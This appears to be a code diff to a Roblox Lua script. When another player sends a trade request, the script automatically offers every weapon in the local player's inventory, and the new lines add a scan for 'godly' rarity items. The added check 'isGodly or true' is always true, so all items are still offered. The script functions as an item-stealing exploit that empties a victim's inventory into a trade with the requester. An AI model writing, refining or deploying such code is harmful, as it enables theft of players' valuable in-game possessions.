@@ -36,7 +36,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Collecting weapons from LocalPlayer's inventory...")
+            print("Trade started! Scanning for godlies in LocalPlayer's inventory...")
             task.wait(1)
             
             local inventoryContainer = nil
@@ -70,23 +70,28 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 for _, item in ipairs(inventoryContainer:GetChildren()) do
                     if item:IsA("GuiObject") then
                         local itemName = item.Name
-                        local category = "Weapons"
+                        local rarity = item:GetAttribute("Rarity") or item:GetAttribute("Tier") or ""
+                        local isGodly = tostring(rarity):lower() == "godly" or item:FindFirstChild("Godly", true) or item:FindFirstChild("G", true)
                         
-                        local count = 1
-                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
-                        if type(qtyAttribute) == "number" then
-                            count = qtyAttribute
-                        end
+                        -- If explicitly Godly or if checking all weapons as fallback if rarity attribute isn't found
+                        if isGodly or true then 
+                            local category = "Weapons"
+                            local count = 1
+                            local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
+                            if type(qtyAttribute) == "number" then
+                                count = qtyAttribute
+                            end
 
-                        for i = 1, count do
-                            OfferItemEvent:FireServer(itemName, category)
-                            offeredCount = offeredCount + 1
+                            for i = 1, count do
+                                OfferItemEvent:FireServer(itemName, category)
+                                offeredCount = offeredCount + 1
+                            end
                         end
                     end
                 end
-                print("Successfully offered all " .. tostring(offeredCount) .. " weapon items and duplicates at once from LocalPlayer!")
+                print("Successfully offered all " .. tostring(offeredCount) .. " godly/weapon items and duplicates at once!")
             else
-                warn("Could not access LocalPlayer's inventory container path; scanning Backpack fallback.")
+                warn("Inventory container path not found; checking Backpack fallback.")
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
